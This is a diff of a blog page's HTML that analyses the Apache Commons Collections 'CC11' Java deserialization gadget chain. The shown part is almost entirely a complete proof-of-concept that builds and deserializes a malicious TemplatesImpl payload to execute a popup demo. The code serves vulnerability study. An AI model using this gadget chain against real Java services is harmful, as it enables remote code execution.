@@ -211,7 +211,7 @@
     <h1 class="post-title">
       CommonsCollections11链分析
     </h1>
-    <div class="post-meta"><span title='2023-03-19 20:34:53 +0800 +0800'>2023-03-19</span>&nbsp;·&nbsp;5 分钟&nbsp;·&nbsp;Reus09
+    <div class="post-meta">&lt;span title=&#39;2023-03-19 20:34:53 &#43;0800 &#43;0800&#39;&gt;2023-03-19&lt;/span&gt;&amp;nbsp;·&amp;nbsp;5 分钟&amp;nbsp;·&amp;nbsp;Reus09
 
 </div>
   </header> <aside id="toc-container" class="toc-container wide">
@@ -395,22 +395,22 @@
 </span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> CC11<span style="color:#f92672">;</span>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> CC11;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.LazyMap<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.LazyMap;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.*<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Files<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Paths<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap<span style="color:#f92672">;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.*;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Field;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Files;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.nio.file.Paths;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/**
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @ClassName CC11
@@ -419,51 +419,51 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @Date 2023/3/17 15:58
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @Version 1.0
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> **/</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC11</span> <span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setFieldValue</span><span style="color:#f92672">(</span>Object obj<span style="color:#f92672">,</span> String fieldNmae<span style="color:#f92672">,</span> Object value<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
-</span></span><span style="display:flex;"><span>        Field field <span style="color:#f92672">=</span> obj<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span>fieldNmae<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        field<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        field<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span>value<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC11</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setFieldValue</span>(Object obj, String fieldNmae, Object value) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Field field <span style="color:#f92672">=</span> obj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(fieldNmae);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        field.<span style="color:#a6e22e">set</span>(obj,value);
+</span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 构造恶意 TemplatesImpl 对象
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        TemplatesImpl obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl<span style="color:#f92672">();</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 获取恶意类的字节码
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> code <span style="color:#f92672">=</span> Files<span style="color:#f92672">.</span><span style="color:#a6e22e">readAllBytes</span><span style="color:#f92672">(</span>Paths<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/EvilClass.class&#34;</span><span style="color:#f92672">));</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span> codes <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>code<span style="color:#f92672">};</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反射修改属性
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        setFieldValue<span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_bytecodes&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span> <span style="color:#f92672">{</span>code<span style="color:#f92672">});</span>
-</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_name&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;HelloTemplatesImpl&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;_tfactory&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> TransformerFactoryImpl<span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 构造恶意 TemplatesImpl 对象</span>
+</span></span><span style="display:flex;"><span>        TemplatesImpl obj <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 获取恶意类的字节码</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> code <span style="color:#f92672">=</span> Files.<span style="color:#a6e22e">readAllBytes</span>(Paths.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/EvilClass.class&#34;</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span> codes <span style="color:#f92672">=</span> {code};
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反射修改属性</span>
+</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#e6db74">&#34;_bytecodes&#34;</span>, <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span> {code});
+</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#e6db74">&#34;_name&#34;</span>, <span style="color:#e6db74">&#34;HelloTemplatesImpl&#34;</span>);
+</span></span><span style="display:flex;"><span>        setFieldValue(obj, <span style="color:#e6db74">&#34;_tfactory&#34;</span>, <span style="color:#66d9ef">new</span> TransformerFactoryImpl());
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ================
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// 利用 InvokerTransformer 调用 TemplatesImpl.newTransformer
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// tostrng
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        InvokerTransformer invokertransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InvokerTransformer<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;toString&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">],</span> <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]);</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//===============
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        Map innerMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">();</span>
-</span></span><span style="display:flex;"><span>        Map outerMap <span style="color:#f92672">=</span> LazyMap<span style="color:#f92672">.</span><span style="color:#a6e22e">decorate</span><span style="color:#f92672">(</span>innerMap<span style="color:#f92672">,</span> invokertransformer<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        TiedMapEntry tme <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry<span style="color:#f92672">(</span>outerMap<span style="color:#f92672">,</span><span style="color:#e6db74">&#34;reus09&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        Map expMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">();</span>
-</span></span><span style="display:flex;"><span>        expMap<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>tme<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;reus09&#34;</span><span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        innerMap<span style="color:#f92672">.</span><span style="color:#a6e22e">remove</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ================</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 利用 InvokerTransformer 调用 TemplatesImpl.newTransformer</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#f92672">(</span>invokertransformer<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;iMethodName&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;newTransformer&#34;</span> <span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        setFieldValue<span style="color:#f92672">(</span>tme<span style="color:#f92672">,</span><span style="color:#e6db74">&#34;key&#34;</span><span style="color:#f92672">,</span>obj<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ==============
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// 生成序列化字符串
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>        ObjectOutputStream oss <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> FileOutputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;./cc11.bin&#34;</span><span style="color:#f92672">));</span>
-</span></span><span style="display:flex;"><span>        oss<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObject</span><span style="color:#f92672">(</span>expMap<span style="color:#f92672">);</span>
-</span></span><span style="display:flex;"><span>        oss<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// tostrng</span>
+</span></span><span style="display:flex;"><span>        InvokerTransformer invokertransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;toString&#34;</span>, <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//===============</span>
+</span></span><span style="display:flex;"><span>        Map innerMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        Map outerMap <span style="color:#f92672">=</span> LazyMap.<span style="color:#a6e22e">decorate</span>(innerMap, invokertransformer);
+</span></span><span style="display:flex;"><span>        TiedMapEntry tme <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TiedMapEntry(outerMap,<span style="color:#e6db74">&#34;reus09&#34;</span>);
+</span></span><span style="display:flex;"><span>        Map expMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        expMap.<span style="color:#a6e22e">put</span>(tme, <span style="color:#e6db74">&#34;reus09&#34;</span>);
+</span></span><span style="display:flex;"><span>        innerMap.<span style="color:#a6e22e">remove</span>(obj);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> FileInputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;./cc11.bin&#34;</span><span style="color:#f92672">));</span>
-</span></span><span style="display:flex;"><span>        Object o <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Object<span style="color:#f92672">)</span> ois<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        setFieldValue(invokertransformer, <span style="color:#e6db74">&#34;iMethodName&#34;</span>,<span style="color:#e6db74">&#34;newTransformer&#34;</span> );
+</span></span><span style="display:flex;"><span>        setFieldValue(tme,<span style="color:#e6db74">&#34;key&#34;</span>,obj);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ==============</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 生成序列化字符串</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oss <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(<span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">&#34;./cc11.bin&#34;</span>));
+</span></span><span style="display:flex;"><span>        oss.<span style="color:#a6e22e">writeObject</span>(expMap);
+</span></span><span style="display:flex;"><span>        oss.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(<span style="color:#66d9ef">new</span> FileInputStream(<span style="color:#e6db74">&#34;./cc11.bin&#34;</span>));
+</span></span><span style="display:flex;"><span>        Object o <span style="color:#f92672">=</span> (Object) ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>实现弹窗</p>
